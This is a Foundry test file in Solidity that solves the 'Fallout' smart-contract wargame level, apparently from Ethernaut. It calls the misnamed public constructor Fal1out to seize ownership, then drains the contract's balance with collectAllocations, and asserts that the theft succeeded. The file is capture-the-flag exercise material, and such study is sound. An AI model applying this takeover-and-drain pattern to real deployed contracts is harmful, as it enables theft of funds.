// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {console, Test} from "forge-std/Test.sol";
import {Fallout} from "../02_Fallout/Fallout.sol";

contract FalloutTest is Test {
    Fallout public level;
    address public attacker;

    function setUp() public {
        level = new Fallout();
        attacker = vm.addr(1); // makeAddr("attacker");
        vm.deal(attacker, 1 ether); // give attacker some ether
        assertTrue(level.owner() != attacker, "Attacker should not be the owner initially");
        assertTrue(level.allocatorBalance(attacker) == 0, "Attacker should not have any allocation");
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        // step 1: change ownership
        level.Fal1out{value: 0.0001 ether}();  // valid in Solidity >= 0.7.0
        // level.Fal1out.value(0.0001 ether)();  // In Solidity 0.6.x, you must use .value() notation
        uint256 balanceBefore = address(attacker).balance / 1e15;
        console.log("Attacker balance(finney) before exploit: ", balanceBefore);
        console.log("contract balance(finney) before exploit: ", address(level).balance / 1e15);

        // step 2: drain contract
        level.collectAllocations();
        uint256 balanceAfter = address(attacker).balance / 1e15;
        console.log("Attacker balance(finney) after exploit: ", balanceAfter);
        assertGt(balanceAfter, balanceBefore, "Exploit failed: Attacker balance did not increase");
        assertEq(address(level).balance, 0, "Contract balance should be 0 after withdrawal");
        vm.stopPrank();
    }
}
